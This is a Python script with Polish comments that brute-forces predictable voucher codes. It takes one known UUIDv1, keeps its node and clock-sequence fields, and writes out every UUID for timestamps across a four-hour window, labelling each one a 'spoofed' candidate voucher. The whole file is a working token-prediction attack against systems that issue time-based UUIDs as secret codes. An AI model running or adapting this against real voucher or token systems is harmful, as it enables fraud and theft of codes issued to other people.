import uuid
import datetime

# --- KONFIGURACJA ---
REFERENCE_UUID = "37f0010f-a489-11f0-ac99-026ccdf7d769"
OUTPUT_FILE = "vouchers_fuzzy_scan.txt"

# Skanujemy szerzej na wypadek innej strefy czasowej (np. 18:00 - 02:00)
START_DT = datetime.datetime(2025, 11, 20, 20, 0, 0)
END_DT = datetime.datetime(2025, 11, 21, 0, 0, 0)

# Ile mikrosekund po pełnej minucie sprawdzać?
# 10000 = 0.01 sekundy. Jeśli serwer był wolny, zwiększ do 100000 (0.1s)
MICROSECOND_FUZZ = 10000 

def get_ref_fields(ref_uuid_str):
    ref = uuid.UUID(ref_uuid_str)
    return ref.fields

def generate_uuid1_precise(ref_fields, timestamp_100ns):
    _, _, _, clock_seq_hi, clock_seq_low, node = ref_fields
    
    time_low = timestamp_100ns & 0xffffffff
    time_mid = (timestamp_100ns >> 32) & 0xffff
    time_hi_version = (timestamp_100ns >> 48) & 0x0fff
    time_hi_version |= (1 << 12)
    
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi, clock_seq_low, node))

# --- GŁÓWNA PĘTLA ---
ref_fields = get_ref_fields(REFERENCE_UUID)
current_minute = START_DT
epoch = datetime.datetime(1582, 10, 15)

print(f"[*] Rozpoczynam skanowanie rozmyte (Fuzzy Scan)...")
print(f"[*] Zakres minut: {START_DT} do {END_DT}")
print(f"[*] Dla każdej minuty sprawdzam pierwsze {MICROSECOND_FUZZ} mikrosekund.")

counter = 0

with open(OUTPUT_FILE, "w") as f:
    while current_minute < END_DT:
        # Obliczamy bazowy timestamp dla pełnej minuty (XX:XX:00.000000)
        delta = current_minute - epoch
        base_timestamp_100ns = int(delta.total_seconds() * 10000000)
        
        # Pętla wewnętrzna: generuje kody dla opóźnień (jittera)
        # UUIDv1 operuje na 100ns, więc mnożymy mikrosekundy * 10
        for offset_100ns in range(0, MICROSECOND_FUZZ * 10): 
            target_timestamp = base_timestamp_100ns + offset_100ns
            spoofed_uuid = generate_uuid1_precise(ref_fields, target_timestamp)
            f.write(f"{spoofed_uuid}\n")
            counter += 1
        
        # Przejdź do kolejnej minuty
        current_minute += datetime.timedelta(minutes=1)

print(f"[*] Zakończono. Wygenerowano {counter} potencjalnych voucherów.")
print(f"[*] Sprawdź, czy Twój poszukiwany UUID znajduje się w pliku {OUTPUT_FILE}")
